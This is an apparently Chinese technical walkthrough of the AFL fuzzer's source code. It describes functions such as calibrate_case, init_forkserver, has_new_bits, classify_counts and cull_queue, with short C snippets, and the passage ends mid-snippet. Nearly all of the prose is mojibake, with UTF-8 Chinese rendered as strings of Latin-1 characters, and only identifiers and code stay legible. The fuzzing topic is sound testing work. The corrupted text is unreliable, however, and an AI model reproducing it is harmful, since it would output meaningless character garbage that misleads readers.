<p><strong>count_class_lookup8</strong>ç”¨æ¥å¯¹è·¯å¾„å‘½ä¸­ç‡åšè§„æ•´ã€‚æ¯”å¦‚æœ‰äº›æ—¶å€™<strong>A-&gt;B</strong>ï¼Œå‡ºç°äº†4æ¬¡ï¼Œæœ‰æ—¶å€™å‡ºç°5æ¬¡ï¼Œè¿™å¯èƒ½å¹¶ä¸æ„å‘³ç€å‡ºç°æ–°çš„è·¯å¾„ã€‚åŒæ—¶ä¹Ÿä¸ºäº†å‡å°‘å› ä¸ºå‘½ä¸­æ¬¡æ•°ä¸ä¸€æ ·å¯¼è‡´çš„åŒºåˆ«ã€‚äºæ˜¯å°±å®šä¹‰äº†<strong>count_class_lookup8</strong>ç”¨æ¥åšä¸€ä¸ªè§„æ•´ã€‚æŠŠ<strong>4-7</strong>æ¬¡éƒ½çœ‹ä½œ<strong>8</strong>æ¬¡ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p>
<p>è€Œ<strong>AFL</strong>ä¸­è¿›è¡Œè§„æ•´çš„æ—¶å€™ä¸€æ¬¡æ€§è¯»å…¥2å­—èŠ‚ï¼Œäºæ˜¯å‡ºç°äº†count_class_lookup16ã€‚</p>
<h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><p>åˆ›å»ºè¾“å‡ºæ–‡ä»¶å¤¹ä»¥åŠè®°å½•fdã€‚</p>
<h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><p>ä»è¾“å…¥æ–‡ä»¶å¤¹é‡Œè¯»å–æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶å°†å…¶åŠ å…¥æµ‹è¯•é˜Ÿåˆ—ä¸­ã€‚</p>
<ul>
<li>nl_cnt &#x3D; scandir(in_dir, &amp;nl, NULL, alphasort); è®°å½•æ–‡ä»¶æ•°é‡å’Œä¿¡æ¯</li>
<li>é€šè¿‡å¾ªç¯éå†æ‰€æœ‰æ–‡ä»¶<ul>
<li>é€šè¿‡æ–‡ä»¶å±æ€§ï¼Œå¤§å°å’Œåç§°è¿‡æ»¤æ‰æ— æ•ˆæ–‡ä»¶</li>
<li>add_to_queue(fn, st.st_size, passed_det); é€šè¿‡ç­›é€‰ï¼Œåˆ™åŠ å…¥æµ‹è¯•é˜Ÿåˆ—</li>
</ul>
</li>
</ul>
<h2 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h2><p>å¢åŠ æµ‹è¯•æ ·ä¾‹åˆ°é˜Ÿåˆ—ä¸­ã€‚</p>
<ul>
<li>æ–°å»ºä¸€ä¸ª<strong>queue_entry</strong>ç»“æ„ä½“ä»¥è®°å½•<strong>test case</strong>ã€‚</li>
<li>æ›´æ–°<strong>max_depth</strong></li>
<li>å¦‚æœ<strong>queue_top</strong>å­˜åœ¨ï¼Œåˆ™<strong>queue_top-&gt;next &#x3D; q; queue_top &#x3D; q;<strong>ï¼Œå¦åˆ™</strong>q_prev100 &#x3D; queue &#x3D; queue_top &#x3D; q;</strong></li>
<li><strong>queued_paths</strong>å’Œ<strong>pending_not_fuzzed</strong>åŠ 1</li>
<li>å¦‚æœ<strong>queued_paths % 100 &#x3D; 0</strong>ï¼Œåˆ™<strong>q_prev100-&gt;next_100 &#x3D; q; q_prev100 &#x3D; q;</strong></li>
<li>è®¾ç½®<strong>last_path_time &#x3D; get_cur_time();</strong></li>
</ul>
<h2 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h2><p>åŠ è½½è‡ªåŠ¨ç”Ÿæˆçš„æå–å‡ºæ¥çš„è¯å…¸tokenã€‚ä»ç›®æ ‡æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼Œå¦‚æœæ»¡è¶³è¦æ±‚åˆ™è°ƒç”¨<strong>maybe_add_auto(tmp, len);</strong></p>
<h2 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h2><ul>
<li>éå†<strong>mem</strong>é‡Œçš„å­—èŠ‚ï¼Œå½“å‡ºç°æœ‰å­—èŠ‚å’Œç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸åŒæ—¶åœæ­¢éå†ã€‚</li>
<li>å¦‚æœmem[0]&#x3D;&#x3D;mem[1]ï¼Œåˆ™ç›´æ¥è¿”å›</li>
<li>å¦‚æœ<strong>mem</strong>çš„é•¿åº¦ä¸º<strong>2</strong>ï¼Œåˆ™å°†<strong>memå’Œinteresting_16</strong>è¿›è¡Œæ¯”è¾ƒï¼Œå‡ºç°ç›¸åŒåˆ™ç›´æ¥è¿”å›</li>
<li>å¦‚æœ<strong>mem</strong>çš„é•¿åº¦ä¸º<strong>4</strong>ï¼Œåˆ™å°†<strong>memå’Œinteresting_32</strong>è¿›è¡Œæ¯”è¾ƒï¼Œå‡ºç°ç›¸åŒåˆ™ç›´æ¥è¿”å›</li>
<li>å°†<strong>memå’Œextrasä¸­ç°æœ‰çš„æ•°æ®</strong>è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå‡ºç°ä¸<strong>mem</strong>ç›¸åŒçš„ç‰‡æ®µåˆ™ç›´æ¥é€€å‡ºã€‚</li>
<li>è®¾ç½®auto_changed &#x3D; 1;</li>
<li>éå†<strong>a_extras</strong>ï¼Œå‡ºç°ç›¸åŒåˆ™a_extras[i].hit_cnt++ï¼›ï¼Œå¦åˆ™æŠŠ<strong>mem</strong>åŠ å…¥<strong>a_extras</strong></li>
</ul>
<h2 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h2><p>ä¸º<strong>in_dir</strong>é‡Œçš„testcaseåœ¨<strong>out_dir&#x2F;queue</strong>é‡Œåˆ›å»º<strong>hard link</strong>ã€‚éå†è¾“å…¥ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆå‘½åè§„èŒƒï¼Œå¦‚æœä¸ç¬¦åˆåˆ™æŒ‰ç…§è§„èŒƒé‡æ–°å‘½åï¼Œä¹‹ååˆ›å»ºç¡¬é“¾æ¥ã€‚</p>
<h2 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h2><p>å¦‚æœæŒ‡å®šäº†<strong>extras_dir</strong>ï¼Œé‚£ä¹ˆä»<strong>extras_dir</strong>é‡Œè¯»å–æ•°æ®åˆ°<strong>extras</strong>é‡Œï¼Œå¹¶æŒ‰ç…§å¤§å°æ’åºã€‚</p>
<h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><p>æ²¡æœ‰æŒ‡å®š<strong>timeout_given</strong>æ—¶è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œè®¾ç½®<strong>timeout_given</strong>ã€‚</p>
<h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>è¯†åˆ«å‘½ä»¤è¡Œå‚æ•°ä¸­æ˜¯å¦å«æœ‰**@@<strong>ï¼Œå¦‚æœå­˜åœ¨åˆ™æ›¿æ¢ä¸º</strong>out_dir&#x2F;.cur_input**ã€‚</p>
<h2 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h2><p>å¦‚æœæ²¡æœ‰æŒ‡å®š<strong>out_file</strong>ï¼Œé‚£ä¹ˆåˆ é™¤æ—§çš„å¹¶åˆ›å»ºæ–°çš„<strong>out_dir&#x2F;.cur_input</strong>ï¼Œå¹¶è·å–å…¶fdå­˜æ”¾åˆ°<strong>out_fd</strong>ä¸­ã€‚</p>
<h2 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h2><p>æ£€æŸ¥ç›®æ ‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä»¥åŠç¡®ä¿ä»–ä¸æ˜¯ä¸€ä¸ªshell scriptã€‚å¹¶æ£€æŸ¥æ˜¯å¦æ˜¯å®Œæ•´çš„elfæ–‡ä»¶ä»¥åŠæ˜¯å¦è¢«æ’æ¡©ã€‚</p>
<h2 id="get-cur-time"><a href="#get-cur-time" class="headerlink" title="get_cur_time"></a>get_cur_time</h2><p>æ¯«ç§’çº§è·å–æ—¶é—´</p>
<h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼Œæ£€æŸ¥æ˜¯å¦æŒ‰ç…§é¢„æœŸè¿›è¡Œã€‚</p>
<ul>
<li>è·å–ç¯å¢ƒå˜é‡<strong>AFL_SKIP_CRASHES</strong></li>
<li>éå†queue<ul>
<li>æ‰“å¼€q-&gt;fnameï¼Œå¹¶è¯»å–å…¶å†…å®¹ã€‚</li>
<li>è°ƒç”¨<strong>res &#x3D; calibrate_case(argv, q, use_mem, 0, 1);</strong></li>
<li>å¦‚æœstop_soon&#x3D;&#x3D;1ï¼Œåˆ™ç›´æ¥è¿”å›ã€‚</li>
<li>å¦‚æœ<strong>res</strong>ä¸ºcrash_modeæˆ–è€…FAULT_NOBITSï¼Œåˆ™æ‰“å°æç¤ºã€‚</li>
<li>æ ¹æ®é”™è¯¯ç±»å‹æŠ›å‡ºä¸åŒå¼‚å¸¸ã€‚</li>
<li>å¦‚æœ<strong>q-&gt;var_behavior</strong>ä¸ºçœŸï¼Œè¯´æ˜è¯¥æµ‹è¯•æ ·ä¾‹å¤šæ¬¡è¿è¡Œæ‰€è¦†ç›–çš„è·¯å¾„ä¸åŒã€‚</li>
</ul>
</li>
</ul>
<h2 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h2><p>æµ‹è¯•è¾“å…¥æ ·ä¾‹æ˜¯å¦ä¼šè§¦å‘å¼‚å¸¸ï¼Œä»¥åŠæ£€æµ‹æ–°å‘ç°çš„è·¯å¾„æ ·ä¾‹çš„è¡Œä¸ºæ˜¯å¦å¯å˜ã€‚</p>
<ul>
<li>å¦‚æœ<strong>q-&gt;exec_cksum</strong>ä¸º0ï¼Œä»£è¡¨è¿™ä¸ªæµ‹è¯•æ ·ä¾‹ç¬¬ä¸€æ¬¡è¿è¡Œï¼ŒæŠŠfirst_runç½®ä¸º1ã€‚</li>
<li>ä¿æŒåŸæ¥çš„stage_curã€stage_maxã€stage_nameã€‚</li>
<li>å¦‚æœæµ‹è¯•æ ·ä¾‹ä¸æ˜¯æ¥è‡ªqueueï¼Œåˆ™use_tmoutå¢å¤§ï¼Œä¸”q-&gt;cal_failed++;ã€‚</li>
<li>è®¾ç½®stage_name &#x3D; â€œcalibrationâ€;ï¼Œå¹¶ä¸”é€šè¿‡fast_calæ¥åˆ¤æ–­ï¼Œstage_maxæ˜¯3è¿˜æ˜¯CAL_CYCLESï¼ˆé»˜è®¤8ï¼‰ï¼Œå³è¿™ä¸ªæ ·ä¾‹æµ‹è¯•çš„æ¬¡æ•°ã€‚</li>
<li>ä¸æ˜¯dumb modeï¼Œå¹¶ä¸”<strong>forkserver</strong>æ²¡æœ‰å¯åŠ¨ï¼Œåˆ™è°ƒç”¨**init_forkserver(argv);**ã€‚</li>
<li>å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œè¿™ä¸ªæµ‹è¯•æ ·ä¾‹ï¼Œåˆ™æŠŠ<strong>trace_bits</strong>æ‹·è´è¿›<strong>first_trace</strong>ã€‚</li>
<li>å¼€å§‹calibrate stage<ul>
<li>å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œåœ¨ç¬¬ä¸€è½®calibrate stageç»“æŸæ—¶ï¼Œæ˜¾ç¤ºç•Œé¢ï¼Œå±•ç¤ºæ‰§è¡Œç»“æœã€‚</li>
<li>è°ƒç”¨<strong>write_to_testcase(use_mem, q-&gt;len);<strong>ï¼ŒæŠŠæµ‹è¯•å†…å®¹è®°å½•åˆ°</strong>out_file</strong>ä¸­ã€‚</li>
<li>è°ƒç”¨<strong>run_target(argv, use_tmout);<strong>æ‰§è¡Œæµ‹è¯•æ ·ä¾‹ï¼Œç»“æœä¿å­˜åœ¨</strong>fault</strong>ä¸­ã€‚</li>
<li>å¦‚æœè¿™æ˜¯ç¬¬ä¸€è½®calibrate caseï¼Œä¸æ˜¯dumb modeï¼Œå¹¶ä¸”trace_bitsæ²¡æœ‰è®°å½•åˆ°æ•°æ®ï¼Œåˆ™è®¾ç½®fault &#x3D; FAULT_NOINSTï¼Œè·³è½¬åˆ°abort_calibrationã€‚</li>
<li>é€šè¿‡<strong>hash32(trace_bits, MAP_SIZE, HASH_CONST);<strong>è®¡ç®—å‡º</strong>cksum</strong>ã€‚</li>
<li>å¦‚æœ<strong>q-&gt;exec_cksum !&#x3D; cksum</strong>ï¼Œä»£è¡¨ä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œæˆ–è€…è¿™ä¸ªæµ‹è¯•æ ·ä¾‹è¡Œä¸ºå¯å˜ã€‚<ul>
<li>u8 hnb &#x3D; has_new_bits(virgin_bits);</li>
<li>å¦‚æœhnb &gt; new_bitsï¼Œåˆ™new_bits &#x3D; hnbã€‚</li>
<li>å¦‚æœq-&gt;exec_cksumä¸ä¸º0ï¼Œåˆ™ä»£è¡¨ä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œã€‚<ul>
<li>å¦‚æœvar_bytesä¸ºç©ºï¼Œå¹¶ä¸”first_trace[i] !&#x3D; trace_bits[i]ï¼Œåˆ™è®¾ç½®var_bytes[i] &#x3D; 1ï¼Œstage_max   &#x3D; CAL_CYCLES_LONGã€‚</li>
<li>var_detected &#x3D; 1;</li>
</ul>
</li>
<li>å¦åˆ™ï¼Œä»£è¡¨æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œã€‚<ul>
<li>è®¾ç½®q-&gt;exec_cksum &#x3D; cksum;</li>
<li>æ‹·è´<strong>trace_bits</strong>è¿›<strong>first_trace</strong></li>
</ul>
</li>
</ul>
</li>
<li>è®¡ç®—æ—¶é—´å’Œè½®æ¬¡ï¼Œå¹¶è®¡ç®—ä¸€äº›ä¿¡æ¯</li>
<li>å¦‚æœnew_bits &#x3D;&#x3D; 2 &amp;&amp; !q-&gt;has_new_covï¼Œåˆ™è®¾ç½®q-&gt;has_new_cov &#x3D; 1ï¼Œå¹¶ä¸”queued_with_cov++ã€‚</li>
<li>å¦‚æœvar_detectedä¸º1ï¼Œåˆ™å½“å‰æµ‹è¯•ç”¨ä¾‹è¡Œä¸ºå¯å˜ã€‚è°ƒç”¨mark_as_variable(q)ï¼Œå¹¶ä¸”queued_variable++ã€‚</li>
<li>æ¢å¤stageå€¼ã€‚</li>
<li>å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œstageåˆ™è°ƒç”¨show_statsï¼Œå±•ç¤ºçŠ¶æ€ã€‚</li>
</ul>
</li>
</ul>
<h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h2><p>åˆå§‹åŒ–<strong>fork server</strong>ã€‚</p>
<ul>
<li>å»ºç«‹çŠ¶æ€ç®¡é“<strong>st_pipe</strong>å’Œæ§åˆ¶ç®¡é“<strong>ctl_pipe</strong>ã€‚</li>
<li>forkå‡ºå­è¿›ç¨‹<ul>
<li>æŠŠ<strong>FORKSRV_FD</strong>é‡å®šå‘åˆ°<strong>ctl_pipe[0]<strong>ï¼ŒæŠŠ</strong>FORKSRV_FD+1</strong>é‡å®šå‘åˆ°**st_pipe[1]**ã€‚</li>
<li>å…³é—­ä¸€äº›é—®ä»·æè¿°ç¬¦ã€‚</li>
<li>è°ƒç”¨<strong>execv(target_path, argv)<strong>ã€‚è¿™é‡Œä¼šæ‰§è¡Œæˆ‘ä»¬ä¹‹å‰æ’æ¡©çš„ç¨‹åºï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶ï¼Œä¼šè°ƒç”¨</strong>__afl_fork_wait_loop</strong>ï¼Œä»¥å……å½“<strong>fork server</strong>ã€‚</li>
<li>å¦‚æœå¤±è´¥ï¼Œåˆ™*(u32*)trace_bits &#x3D; EXEC_FAIL_SIGã€‚</li>
</ul>
</li>
<li>çˆ¶è¿›ç¨‹<ul>
<li>å…³é—­ctl_pipe[0]å’Œst_pipe[1]ã€‚</li>
<li>ç­‰å¾…<strong>fork server</strong>å¯åŠ¨ã€‚<ul>
<li>èƒ½ä»**st_pipe[0]**è¯»å–åˆ°4å­—èŠ‚å³ä»£è¡¨å¯åŠ¨æˆåŠŸï¼Œè¶…æ—¶åˆ™è¡¨ç¤ºå¤±è´¥ã€‚</li>
</ul>
</li>
<li>å­è¿›ç¨‹å¼‚å¸¸å¤„ç†</li>
</ul>
</li>
</ul>
<h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h2><p>ç”¨æ¥æ£€æŸ¥æ˜¯å¦å‡ºç°æ–°è·¯å¾„ä»¥åŠæ˜¯å¦è¾¹çš„å‘½ä¸­æ¬¡æ•°å‘ç”Ÿå˜åŒ–ã€‚</p>
<ul>
<li>åˆå§‹åŒ–<strong>current</strong>ä¸º<strong>trace_bits</strong>ï¼Œ<strong>virgin</strong>ä¸º<strong>virgin_map</strong>ï¼Œret&#x3D;0ã€‚</li>
<li>8å­—èŠ‚ä¸€ç»„éå†<strong>trace_bits</strong>ã€‚å¦‚æœ**(*(u32*)current)<strong>ä¸ä¸º0ï¼Œå¹¶ä¸”</strong>(*(u32*)current &amp; *(u32*)virgin)**ä¸ä¸º0ã€‚åˆ™ä»£è¡¨å‡ºç°æ–°çš„è·¯å¾„æˆ–è€…è·¯å¾„å‘½ä¸­æ¬¡æ•°å‡ºç°å˜åŒ–ã€‚<ul>
<li>å¦‚æœret&lt;2ã€‚<ul>
<li>å¦‚æœå­˜åœ¨**(cur[i] &amp;&amp; vir[i] &#x3D;&#x3D; 0xff)**ï¼Œé‚£ä¹ˆè®¾ç½®ret&#x3D;2ï¼Œè¿™ä»£è¡¨å‡ºç°æ–°çš„è·¯å¾„ã€‚</li>
</ul>
</li>
<li>*virgin &amp;&#x3D; ~*current;</li>
</ul>
</li>
<li>å¦‚æœretå­˜åœ¨ï¼Œå¹¶ä¸”<strong>virgin_map &#x3D;&#x3D; virgin_bits</strong>ï¼Œåˆ™è®¾ç½®bitmap_changed &#x3D; 1</li>
<li>è¿”å›ret</li>
</ul>
<h2 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h2><p>ç»Ÿè®¡éé›¶å­—èŠ‚æ•°</p>
<ul>
<li>æ¯4å­—èŠ‚ä¸€ç»„éå†memï¼Œu32* ptr &#x3D; (u32*)memï¼Œret&#x3D;0.</li>
<li>å°†ptr ä¸0xffï¼Œ0xff00ï¼Œ0xff0000ï¼Œ0xff000000ï¼Œåˆ†åˆ«ç›¸ä¸ï¼Œå¦‚æœéé›¶ï¼Œåˆ™ret++ã€‚</li>
<li>è¿”å›retï¼Œè¡¨ç¤ºéé›¶å­—èŠ‚æ•°ã€‚</li>
</ul>
<h2 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h2><p>ç”¨æ¥forkå‡ºå­è¿›ç¨‹è¿›è¡Œfuzzæµ‹è¯•ã€‚</p>
<ul>
<li>é¦–å…ˆæ¸…ç©º<strong>trace_bits</strong>ï¼ˆè®°å½•è·¯å¾„çš„å…±äº«å†…å­˜ï¼‰ã€‚</li>
<li>å¦‚æœæ˜¯dumb modeæˆ–è€…no_forkserveréé›¶ã€‚<ul>
<li>forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨å…³é—­ä¸€ç³»åˆ—æ–‡ä»¶æè¿°ç¬¦åï¼Œå»æ‰§è¡Œ**execv(target_path, argv)**ã€‚</li>
</ul>
</li>
<li>å¦åˆ™æ­£å¸¸é€šè¿‡<strong>fork server</strong>æ¥forkå‡ºä¸€ä¸ªè¿›ç¨‹è¿›è¡Œfuzzã€‚<ul>
<li>é€šè¿‡<strong>fsrv_ctl_fd</strong>å†™å…¥4å­—èŠ‚ï¼Œæ¥å‘Šè¯‰fork serverè¦å¼€å§‹fuzzã€‚</li>
<li>å†é€šè¿‡<strong>fsrv_st_fd</strong>è¯»å–4å­—èŠ‚ï¼Œåˆ¤æ–­fork serveræ˜¯å¦æˆåŠŸforkå‡ºå­è¿›ç¨‹ã€‚</li>
</ul>
</li>
<li>AFLè‡ªå·±ä¼šç­‰å¾…forkå‡ºæ¥çš„ç¨‹åºæ‰§è¡Œç»“æŸï¼Œå¹¶è·å–çŠ¶æ€ä¿å­˜åˆ°statusä¸­ã€‚total_execs++ã€‚</li>
<li>è°ƒç”¨classify_counts((u64*)trace_bits)ã€‚</li>
<li>æ ¹æ®<strong>status</strong>çš„å€¼ï¼Œè¿”å›fuzzæ‰§è¡ŒçŠ¶æ€ã€‚</li>
</ul>
<h2 id="classify-counts-u64-mem"><a href="#classify-counts-u64-mem" class="headerlink" title="classify_counts(u64* mem)"></a>classify_counts(u64* mem)</h2><p>ç”¨æ¥å¯¹<strong>trace_bits</strong>è¿›è¡Œåˆ†ç±»è§„æ•´ã€‚</p>
<ul>
<li><p>8å­—èŠ‚ä¸€ç»„éå†<strong>trace_bits</strong>ã€‚</p>
<ul>
<li>æ¯æ¬¡2å­—èŠ‚è¿›è¡Œè§„æ•´ã€‚</li>
<li>ä»£ç å¦‚ä¸‹</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">mem16[<span class="number">2</span>] = count_class_lookup16[mem16[<span class="number">2</span>]];</span><br><span class="line">mem16[<span class="number">3</span>] = count_class_lookup16[mem16[<span class="number">3</span>]];</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>å½“å‘ç°æ–°çš„è·¯å¾„æ—¶ï¼Œåˆ¤æ–­è§¦å‘æ–°çš„è·¯å¾„çš„æ ·ä¾‹æ˜¯å¦æ›´åŠ favorableï¼Œfavorableçš„æ„æ€æ˜¯å½“å‰è·¯å¾„æ˜¯å¦åŒ…å«æœ€å°çš„è·¯å¾„é›†åˆæ¥éå†åˆ°bitmapä¸­çš„æ‰€æœ‰ä½ã€‚</p>
<ul>
<li>fav_factor &#x3D; q-&gt;exec_us * q-&gt;lenã€‚</li>
<li>éå†trace_bitsï¼Œå¦‚æœtrace_bits[i]å­˜åœ¨ï¼Œåˆ™ä»£è¡¨è¿™é‡Œæ‰€æŒ‡çš„è·¯å¾„å·²è¢«è¦†ç›–ã€‚<ul>
<li>å¦‚æœfav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;lenï¼Œåˆ™ä»£è¡¨åŸæ¥çš„æ›´ä¼˜ï¼Œç›´æ¥continueï¼Œå»åˆ¤æ–­ä¸‹ä¸€æ¡è·¯å¾„ã€‚</li>
<li>å¦åˆ™å°±è¯´æ˜è¿™ä¸ªæ–°æ ·ä¾‹å¯¹äºå½“å‰è¾¹æ›´åŠ favorableï¼Œâ€“top_rated[i]-&gt;tc_refï¼Œtop_rated[i]-&gt;trace_mini &#x3D; 0ã€‚</li>
</ul>
</li>
<li>æ›¿æ¢top_rated[i]ï¼Œtop_rated[i] &#x3D; qï¼Œå¹¶ä¸”q-&gt;tc_ref++ã€‚</li>
<li>å¦‚æœq-&gt;trace_mini&#x3D;&#x3D;0ï¼Œåˆ™è°ƒç”¨minimize_bits(q-&gt;trace_mini, trace_bits)ã€‚</li>
<li>score_changed &#x3D; 1</li>
</ul>
<h2 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h2><p>å°†æè¿°è¾¹æ˜¯å¦è¢«è¦†ç›–åˆ°çš„ä»¥å­—èŠ‚è®°å½•çš„<strong>trace_bits</strong>ï¼Œè½¬åŒ–ä¸ºä»¥<strong>bit</strong>è®°å½•çš„å›¾ã€‚</p>
<h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><p>ç”¨æ¥ç²¾ç®€é˜Ÿåˆ—</p>
<ul>
<li>å¦‚æœæ˜¯dumb modeï¼Œæˆ–è€…score_changed&#x3D;&#x3D;0ï¼Œé‚£ä¹ˆå°±ç›´æ¥è¿”å›ã€‚</li>
<li>è®¾ç½®score_changed&#x3D;0ï¼Œåˆå§‹åŒ–temp_v[MAP_SIZE &gt;&gt; 3]ä¸º0xffã€‚</li>
<li>éå†queueé˜Ÿåˆ—ï¼Œä½¿å¾—q-&gt;favored &#x3D; 0ã€‚</li>
<li>éå†<strong>top_rated</strong>æ¬¡ã€‚<ul>
<li>å¦‚æœtop_rated[i]å­˜åœ¨ï¼Œå¹¶ä¸”temp_v[i &gt;&gt; 3] &amp; (1 &lt;&lt; (i &amp; 7))å­˜åœ¨ã€‚<ul>
<li>ä»temp_vä¸­æ¸…é™¤æ‰top_rated[i]æ‰€æœ‰è¦†ç›–åˆ°çš„è¾¹ã€‚</li>
<li>top_rated[i]-&gt;favored &#x3D; 1ï¼Œqueued_favored++ã€‚</li>
<li>å¦‚æœtop_rated[i]-&gt;was_fuzzed&#x3D;&#x3D;0ï¼Œåˆ™pending_favored++ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>éå†é˜Ÿåˆ—queueï¼Œè°ƒç”¨mark_as_redundant(q, !q-&gt;favored)ã€‚</li>
</ul>
<h2 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h2><p>æ ‡è®°å†—ä½™é˜Ÿåˆ—ã€‚</p>
<ul>
<li>å¦‚æœstate &#x3D;&#x3D; q-&gt;fs_redundantï¼Œåˆ™ç›´æ¥è¿”å›ã€‚</li>
<li>è®¾ç½®q-&gt;fs_redundant &#x3D; stateã€‚</li>
<li>æ„é€ è·¯å¾„fn&#x3D;â€out_dir&#x2F;queue&#x2F;.state&#x2F;redundant_edges&#x2F;q-&gt;fnameâ€ã€‚</li>
<li>å¯¹stateè¿›è¡Œåˆ¤æ–­ã€‚<ul>
<li>stateå­˜åœ¨ï¼Œåˆ™è¯´æ˜è¯¥é˜Ÿåˆ—å†—ä½™ï¼Œåˆ›å»ºæ–‡ä»¶fnã€‚</li>
<li>stateä¸ºç©ºï¼Œåˆ™åˆ é™¤æ–‡ä»¶ã€‚</li>
</ul>
</li>
</ul>
<h2 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h2><p>åˆå§‹åŒ–ä¹‹åï¼Œæ˜¾ç¤ºä¸€äº›ä¿¡æ¯ï¼Œä»¥åŠè®¾ç½®ä¸€äº›å€¼ã€‚</p>
<h2 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h2><p>ç”¨æ¥æŸ¥è¯¢å¼€å§‹é˜Ÿåˆ—çš„ä½ç½®ã€‚</p>
<ul>
<li>å¦‚æœresuming_fuzz&#x3D;&#x3D;0ï¼Œåˆ™ç›´æ¥é€€å‡ºã€‚</li>
<li>å¦åˆ™å°±æ‰¾åˆ°fuzzer_statsæ–‡ä»¶ï¼Œæ‰“å¼€å¹¶æ‰¾åˆ°cur_pathï¼Œå¹¶è®¾ç½®ä¸ºretã€‚</li>
<li>å¦‚æœret &gt;&#x3D; queued_pathsï¼Œåˆ™ret&#x3D;0ï¼Œè¿”å›retã€‚</li>
</ul>
<h2 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h2><p>ç”¨æ¥æ›´æ–°fuzzer_statsæ–‡ä»¶ã€‚</p>
<h2 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h2><p>ç”¨æ¥è‡ªåŠ¨ä¿å­˜ç”Ÿæˆçš„extrasã€‚</p>
<ul>
<li>å¦‚æœauto_changed&#x3D;&#x3D;0ï¼Œåˆ™ç›´æ¥é€€å‡ºã€‚</li>
<li>æ‰“å¼€â€out_dir&#x2F;queue&#x2F;.state&#x2F;auto_extras&#x2F;auto_%06uâ€æ–‡ä»¶ï¼Œå¹¶å†™å…¥a_extras[i].dataã€‚</li>
</ul>
<h2 id="fuzz-ä¸»å¾ªç¯"><a href="#fuzz-ä¸»å¾ªç¯" class="headerlink" title="fuzz ä¸»å¾ªç¯"></a>fuzz ä¸»å¾ªç¯</h2><p>fuzzçš„è¿‡ç¨‹</p>
<ul>
<li><p>è°ƒç”¨**cull_queue()**ï¼Œç²¾ç®€é˜Ÿåˆ—ã€‚</p>
</li>
<li><p>å¦‚æœqueue_cur&#x3D;&#x3D;0ï¼Œä»£è¡¨æ‰€æœ‰queueå·²è¢«æ‰§è¡Œè¿‡ã€‚</p>
<ul>
<li><p>æœ‰ä»¥ä¸‹è®¾ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">queue_cycle++;</span><br><span class="line">current_entry     = <span class="number">0</span>;</span><br><span class="line">cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">queue_cur         = <span 